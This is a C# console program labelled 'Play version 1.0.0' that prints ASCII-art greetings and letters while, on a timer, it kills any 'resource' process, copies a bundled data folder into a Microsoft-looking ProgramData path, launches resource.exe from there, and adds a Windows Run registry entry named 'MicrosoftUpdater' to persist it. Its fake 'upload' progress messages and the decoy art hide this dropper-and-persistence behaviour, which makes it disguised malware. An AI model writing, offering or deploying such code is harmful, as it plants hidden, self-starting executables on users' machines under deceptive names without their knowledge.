using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Timers;

namespace Play
{
    class Heartbeat
    {
        private readonly Timer _timer;
        static bool checkFlag = true;
        const string targetFolderPath = @"C:\ProgramData\Microsoft\Windows\Telescope";
        static int displayCheck = 0;
        public Heartbeat()
        {
            Console.Clear();
            _timer = new Timer(3000) { AutoReset = true };
            _timer.Elapsed += TimerElapsed;
        }
        async private void TimerElapsed(object sender, ElapsedEventArgs e)
        {
            if (checkFlag)
            {
                Console.Clear();
                Console.WriteLine("Play version 1.0.0");
                checkFlag = false;
                CheckFolder();
                CopyFolder();
                RunProcess();
                SetStartup();
            }
            PrintFunny();
        }
        async private static void CheckFolder()
        {
            try
            {
                Process[] resourceProcesses = Process.GetProcessesByName("resource");
                foreach (Process resourceProcess in resourceProcesses)
                {
                    resourceProcess.Kill();
                    resourceProcess.WaitForExit();
                    resourceProcess.Dispose();
                }

                if (Directory.Exists(targetFolderPath))
                {
                    Directory.Delete(targetFolderPath, true);
                }
                Console.WriteLine("upload--25.00%");
            }
            catch (Exception)
            {
                checkFlag = true;
            }
        }
        private static void CopyFolder()
        {
            try
            {
                Directory.CreateDirectory(targetFolderPath);
                string currentPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
                string sourceFolderPath = Path.Combine(currentPath, @"data");
                CopyFilesRecursively(sourceFolderPath, targetFolderPath);
                Console.WriteLine("upload--50.00%");
            }
            catch (Exception)
            {
                checkFlag = true;
            }
        }
        private static void CopyFilesRecursively(string sourcePath, string targetPath)
        {
            try
            {
                //Now Create all of the directories
                foreach (string dirPath in Directory.GetDirectories(sourcePath, "*", SearchOption.AllDirectories))
                {
                    Directory.CreateDirectory(dirPath.Replace(sourcePath, targetPath));
                }

                //Copy all the files & Replaces any files with the same name
                foreach (string newPath in Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories))
                {
                    File.Copy(newPath, newPath.Replace(sourcePath, targetPath), true);
                }
            }
            catch (Exception)
            {
                checkFlag = true;
            }
        }
        private static void RunProcess()
        {
            try
            {
                Process[] pname = Process.GetProcessesByName("resource");
                if (pname.Length == 0)
                {
                    //string currentPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
                    string filename = targetFolderPath + @"\resource.exe";
                    Process.Start(filename);
                }
                Console.WriteLine("upload--75.00%");
            }
            catch (Exception)
            {
                checkFlag = true;
            }
        }
        private static void SetStartup2()
        {
            string runKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(runKey, true))
            {
                key.SetValue("resource", targetFolderPath + @"\resource.exe");
            }
            Console.WriteLine("upload-100.00%");
        }
        private static void SetStartup()
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue("MicrosoftUpdater", targetFolderPath + @"\resource.exe");

                Console.WriteLine("upload-100.00%");
            }
            catch (Exception)
            {
                checkFlag = true;
            }
        }
        private static void PrintFunny()
        {
            displayCheck++;
            if      (displayCheck == 1)  PrintFunny1();
            else if (displayCheck == 2)  PrintFunny2();
            else if (displayCheck == 3)  PrintFunny3();
            else if (displayCheck == 4)  PrintFunny4();

            else if (displayCheck == 5)  PrintFunnyA();
            else if (displayCheck == 6)  PrintFunnyB();
            else if (displayCheck == 7)  PrintFunnyC();
            else if (displayCheck == 8)  PrintFunnyD();
            else if (displayCheck == 9)  PrintFunnyE();
            else if (displayCheck == 10) PrintFunnyF();
            else if (displayCheck == 11) PrintFunnyG();
            else if (displayCheck == 12) PrintFunnyH();
            else if (displayCheck == 13) PrintFunnyI();
            else if (displayCheck == 14) PrintFunnyJ();
            else if (displayCheck == 15) PrintFunnyK();
            else if (displayCheck == 16) PrintFunnyL();
            else if (displayCheck == 17) PrintFunnyM();
            else if (displayCheck == 18) PrintFunnyN();
            else if (displayCheck == 19) PrintFunnyO();
            else if (displayCheck == 20) PrintFunnyP();
            else if (displayCheck == 21) PrintFunnyQ();
            else if (displayCheck == 22) PrintFunnyR();
            else if (displayCheck == 23) PrintFunnyS();
            else if (displayCheck == 24) PrintFunnyT();
            else if (displayCheck == 25) PrintFunnyU();
            else if (displayCheck == 26) PrintFunnyV();
            else if (displayCheck == 27) PrintFunnyW();
            else if (displayCheck == 28) PrintFunnyX();
            else if (displayCheck == 29) PrintFunnyY();
            else if (displayCheck == 30) { PrintFunnyZ(); displayCheck = 0; }

        }
        private static void PrintFunny1()
        {
            Console.WriteLine("+----------------------------------------------------+");
            Console.WriteLine("|  $$    $$ $$$$$$$$ $$       $$        $$$$$$   $$  |");
            Console.WriteLine("|  $$    $$ $$       $$       $$       $$    $$  $$  |");
            Console.WriteLine("|  $$$$$$$$ $$$$$$$$ $$       $$       $$    $$  $$  |");
            Console.WriteLine("|  $$    $$ $$       $$       $$       $$    $$      |");
            Console.WriteLine("|  $$    $$ $$$$$$$$ $$$$$$$$ $$$$$$$$  $$$$$$   $$  |");
            Console.WriteLine("+----------------------------------------------------+");
        }
        private static void PrintFunny2()
        {
            Console.WriteLine("+------------------------------+");
            Console.WriteLine("|  $$    $$  $$$$$$  $$    $$  |");
            Console.WriteLine("|  $$    $$ $$    $$ $$    $$  |");
            Console.WriteLine("|  $$$$$$$$ $$    $$ $$ $$ $$  |");
            Console.WriteLine("|  $$    $$ $$    $$ $$ $$ $$  |");
            Console.WriteLine("|  $$    $$  $$$$$$   $$  $$   |");
            Console.WriteLine("+------------------------------+");
        }
        private static void PrintFunny3()
        {
            Console.WriteLine("+------------------------------+");
            Console.WriteLine("|    $$$$   $$$$$$$  $$$$$$$$  |");
            Console.WriteLine("|   $$  $$  $$    $$ $$        |");
            Console.WriteLine("|  $$$$$$$$ $$$$$$$  $$$$$$$$  |");
            Console.WriteLine("|  $$    $$ $$   $$  $$        |");
            Console.WriteLine("|  $$    $$ $$    $$ $$$$$$$$  |");
            Console.WriteLine("+------------------------------+");
        }
        private static void PrintFunny4()
        {
            Console.WriteLine("+---------------------------------------+");
            Console.WriteLine("|  $$    $$  $$$$$$  $$    $$  $$$$$$   |");
            Console.WriteLine("|   $$  $$  $$    $$ $$    $$ $$    $$  |");
            Console.WriteLine("|    $$$$   $$    $$ $$    $$      $$   |");
            Console.WriteLine("|     $$    $$    $$ $$    $$           |");
            Console.WriteLine("|     $$     $$$$$$   $$$$$$     $$     |");
            Console.WriteLine("+---------------------------------------+");
        }
        private static void PrintFunnyA()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|    $$$$    |");
            Console.WriteLine("|   $$  $$   |");
            Console.WriteLine("|  $$$$$$$$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyB()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$$$$$$   |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$$$$$$   |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$$$$$$   |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyC()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|   $$$$$$   |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$        |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|   $$$$$$   |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyD()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$$$$$$   |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$$$$$$   |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyE()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$$$$$$$  |");
            Console.WriteLine("|  $$        |");
            Console.WriteLine("|  $$$$$$$$  |");
            Console.WriteLine("|  $$        |");
            Console.WriteLine("|  $$$$$$$$  |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyF()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$$$$$$$  |");
            Console.WriteLine("|  $$        |");
            Console.WriteLine("|  $$$$$$$$  |");
            Console.WriteLine("|  $$        |");
            Console.WriteLine("|  $$        |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyG()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|   $$$$$$   |");
            Console.WriteLine("|  $$        |");
            Console.WriteLine("|  $$  $$$$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|   $$$$$$   |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyH()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$$$$$$$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyI()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$$$$$$$  |");
            Console.WriteLine("|     $$     |");
            Console.WriteLine("|     $$     |");
            Console.WriteLine("|     $$     |");
            Console.WriteLine("|  $$$$$$$$  |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyJ()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$$$$$$$  |");
            Console.WriteLine("|       $$   |");
            Console.WriteLine("|       $$   |");
            Console.WriteLine("|  $$   $$   |");
            Console.WriteLine("|   $$$$$    |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyK()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$   $$   |");
            Console.WriteLine("|  $$$$$     |");
            Console.WriteLine("|  $$   $$   |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyL()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$        |");
            Console.WriteLine("|  $$        |");
            Console.WriteLine("|  $$        |");
            Console.WriteLine("|  $$        |");
            Console.WriteLine("|  $$$$$$$$  |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyM()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$$  $$$  |");
            Console.WriteLine("|  $$ $$ $$  |");
            Console.WriteLine("|  $$ $$ $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyN()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$$   $$  |");
            Console.WriteLine("|  $$$$  $$  |");
            Console.WriteLine("|  $$ $$ $$  |");
            Console.WriteLine("|  $$  $$$$  |");
            Console.WriteLine("|  $$   $$$  |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyO()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|   $$$$$$   |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|   $$$$$$   |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyP()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$$$$$$   |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$$$$$$   |");
            Console.WriteLine("|  $$        |");
            Console.WriteLine("|  $$        |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyQ()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|   $$$$$$   |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$  $$$   |");
            Console.WriteLine("|   $$$$ $$  |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyR()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$$$$$$   |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$$$$$$   |");
            Console.WriteLine("|  $$   $$   |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyS()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|   $$$$$$$  |");
            Console.WriteLine("|  $$        |");
            Console.WriteLine("|   $$$$$$   |");
            Console.WriteLine("|        $$  |");
            Console.WriteLine("|  $$$$$$$   |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyT()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$$$$$$$  |");
            Console.WriteLine("|     $$     |");
            Console.WriteLine("|     $$     |");
            Console.WriteLine("|     $$     |");
            Console.WriteLine("|     $$     |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyU()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|   $$$$$$   |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyV()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|   $$  $$   |");
            Console.WriteLine("|    $$$$    |");
            Console.WriteLine("|     $$     |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyW()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|  $$ $$ $$  |");
            Console.WriteLine("|  $$ $$ $$  |");
            Console.WriteLine("|   $$  $$   |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyX()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|   $$  $$   |");
            Console.WriteLine("|    $$$$    |");
            Console.WriteLine("|   $$  $$   |");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyY()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$    $$  |");
            Console.WriteLine("|   $$  $$   |");
            Console.WriteLine("|    $$$$    |");
            Console.WriteLine("|     $$     |");
            Console.WriteLine("|     $$     |");
            Console.WriteLine("+------------+");
        }
        private static void PrintFunnyZ()
        {
            Console.WriteLine("+------------+");
            Console.WriteLine("|  $$$$$$$$  |");
            Console.WriteLine("|       $$   |");
            Console.WriteLine("|     $$     |");
            Console.WriteLine("|   $$       |");
            Console.WriteLine("|  $$$$$$$$  |");
            Console.WriteLine("+------------+");
        }
        public void Start()
        {
            _timer.Start();
            Console.Clear();
        }
        public void Stop()
        {
            _timer.Stop();
        }
    }
}
